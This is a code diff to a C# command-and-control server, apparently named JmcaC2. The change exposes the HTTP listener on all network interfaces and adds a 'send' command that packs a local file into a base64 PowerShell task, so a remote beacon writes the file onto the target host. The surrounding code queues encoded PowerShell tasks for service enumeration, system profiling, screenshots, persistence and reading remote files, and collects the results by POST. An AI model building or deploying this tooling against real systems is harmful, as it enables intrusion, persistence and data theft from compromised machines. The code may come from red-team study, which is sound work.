@@ -48,7 +48,7 @@ namespace JmcaC2
             }
 
             // setup the http listener
-            listener.Prefixes.Add($"https://localhost:{port}/");
+            listener.Prefixes.Add($"https://*:{port}/");
             listener.Start();
 
             Console.WriteLine($"HTTP Server started on port {port}");
@@ -120,35 +120,56 @@ namespace JmcaC2
                         }
                         break;
                     case "enumservices":
-                        {   
+                        {
                             string encoded = EncodePowershellScript("enumservices.ps1");
                             CreateTask("file", encoded);
                         }
                         break;
                     case "systemprofile":
-                        {   
+                        {
                             string encoded = EncodePowershellScript("systemprofile.ps1");
                             CreateTask("file", encoded);
                         }
                         break;
 
                     case "screenshot":
-                        {   
+                        {
                             string encoded = EncodePowershellScript("screenshot.ps1");
                             CreateTask("file", encoded);
                         }
                         break;
                     case "persistence":
-                        {   
+                        {
                             string encoded = EncodePowershellScript("persistence.ps1");
                             CreateTask("file", encoded);
                         }
                         break;
                     case "file":
-                        {   
+                        {
                             byte[] bytes = Encoding.Unicode.GetBytes("Get-Content -Path " + CmdArgs);
                             string encoded = Convert.ToBase64String(bytes);
                             CreateTask("file", encoded);
+                        }
+                        break;
+                    case "send":
+                        {
+                            string[] CmdData = CmdArgs.Trim().Split(" ", 2);
+                            string path = CmdData.Length > 0 ? CmdData[0] : "";
+                            string targetName = CmdData.Length > 1 ? CmdData[1] : "";
+                            if (File.Exists(path))
+                            {
+                                byte[] data = File.ReadAllBytes(path);
+                                // Convert bytes to Base64
+                                string b64 = Convert.ToBase64String(data);
+                                // Build PowerShell code that decodes Base64 and writes the bytes back out
+                                byte[] bytes = Encoding.Unicode.GetBytes($"[System.IO.File]::WriteAllBytes('{targetName}', [Convert]::FromBase64String('{b64}'))");
+                                string encoded = Convert.ToBase64String(bytes);
+                                CreateTask("file", encoded);
+                            }
+                            else
+                            {
+                                Console.WriteLine("File does not exist: " + CmdArgs);
+                            }
                         }
                         break;
                     case "encode":
@@ -397,7 +418,7 @@ namespace JmcaC2
                         // Handle POST request for task results
                         Console.WriteLine($"Received POST request for task results");
                         string? taskIdx = context.Request.Headers["Task-Index"];
-                        BeaconTask? task = null; 
+                        BeaconTask? task = null;
                         if (taskIdx != null)
                         {
                             Console.WriteLine($"Task #{taskIdx} Results");
@@ -445,7 +466,8 @@ namespace JmcaC2
                             File.WriteAllBytes(dataFilePath, bytes);
 
                             // write out the report file for the task
-                            if (task != null) {
+                            if (task != null)
+                            {
                                 string[] lines =
                                 [
                                     "Task #" + task.Index,
